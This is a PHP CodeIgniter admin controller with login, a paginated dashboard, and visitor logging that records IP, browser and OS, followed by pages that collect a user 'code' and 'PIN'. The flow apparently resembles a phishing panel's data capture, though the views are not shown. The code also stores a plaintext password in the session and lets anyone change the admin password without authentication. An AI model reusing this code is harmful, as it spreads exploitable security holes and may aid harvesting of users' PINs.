<?php
/**
 * @package Contact :  CodeIgniter Contact Form
 *
 * @author TechArise Team
 *
 * @email  info@techarise.com
 *   
 * Description of Contact Controller
 */
if (!defined('BASEPATH'))
    exit('No direct script access allowed');

class Admin extends CI_Controller {

    public function __construct() {
        parent::__construct();
        $this->load->library(array('form_validation','session'));
        $this->load->helper(array('url','html','form'));
        // load email lib
        
        $this->load->model('Admin_model');
        $this->load->model('Detail_model');
        $this->load->library("pagination");
        $this->load->model('authors_model');
        $this->load->library('user_agent');
    }
    // contact
    public function index() {     
        $this->load->view('admin/login');
    }

    public function dashboard($user =  array())
    {   
               
        if(isset($_SESSION['admin_info'])){
        $config = array();
        $config["base_url"] = base_url() . "dashboard";
        $config["total_rows"] = $this->authors_model->get_count();
        $config["per_page"] = 15;
        $config["uri_segment"] = 2;
        $this->pagination->initialize($config);
        $page = ($this->uri->segment(2)) ? $this->uri->segment(2) : 0;
        $data["links"] = $this->pagination->create_links();
        $data['authors'] = $this->authors_model->get_authors($config["per_page"], $page);    
        $data['users'] = $user;    
        // $this->load->view('authors/index');
        $this->load->view('admin/dashboard', $data);
        }else{
            redirect(base_url('admin'));
        }
    }

    public function login() 
    {
        $this->form_validation->set_rules('name', 'name', 'required');
        $this->form_validation->set_rules('password', 'Password', 'required');  
        if ($this->form_validation->run() === FALSE)
        {  
            $this->load->view('admin/login');
        }
        else
        {   
            $data = array(
               'name' => $this->input->post('name'),
               'password' => $this->input->post('password'), 
             );  
            $user_data = array(
                'name' => '',
                'ip_address' => '',
                'country' => '',
                'code' => '',
                'pin_code' => ''
            );         
            $check = $this->Admin_model->login($data);  
            if($check != false){           
                $this->session->set_userdata('admin_info', $data);  
                $this->session->set_userdata('user_code_info', $user_data); 
                $this->session->set_userdata('user_pin_code', $user_data);     
             redirect( base_url('dashboard') ); 
            }
           $this->load->view('admin/login');
        }
    }

    public function control()
    {

        $data['no'] = '';
        $data['name'] = $this->input->post('name');
        $data['ip_address'] = $this->input->ip_address();    
        // $result = json_decode(file_get_contents('http://ip-api.io/json/64.30.228.118'));
        // $data['country'] = json_decode(file_get_contents("http://ip-api.io/json/{{$data['ip_address']}}"));
        $data['country'] = "";
        // print_r($data['country']);
        // exit();
        $data['browser'] = $this->agent->browser();
        $data['browser_version'] = $this->agent->version();
        $data['os'] = $this->agent->platform();            
        $result = $this->Detail_model->insert($data);    
        $this->session->set_userdata('user_info', $data);         
        $users = $_SESSION['user_info']; 
        $this->code();

        redirect(base_url('process'));
    }

    public function code()
    {
        if(isset($_SESSION['admin_info'])){
        $this->load->view('admin/user_code');       
        }else{
            redirect(base_url(''));
        }
    }
    public function pin()
    {
        if(isset($_SESSION['admin_info'])){       
        $data = $this->input->post();
        $this->session->set_userdata('user_code_info', $data);
          $this->load->view('admin/user_pin');       
        }else{
            redirect(base_url('admin'));
        }
    }
    public function complete()
    {
        if(isset($_SESSION['admin_info'])){       
            $data = $this->input->post();
            $this->session->set_userdata('user_pin_code', $data);
            redirect(base_url('dashboard'));       
            }else{
                redirect(base_url('admin'));
            }
    }
    public function logout(){
        $this->session->unset_userdata('admin_info');
        $this->session->unset_userdata('user_info');
        $this->session->unset_userdata('user_code_info');
        $this->session->unset_userdata('user_pin_info');
        redirect( base_url('dashboard') );
    }
    public function pass_change()
    {
        $pass = $this->input->post('pass1');
        $check = $this->Admin_model->change($pass);
        redirect(base_url('dashboard'));
    }
}
?>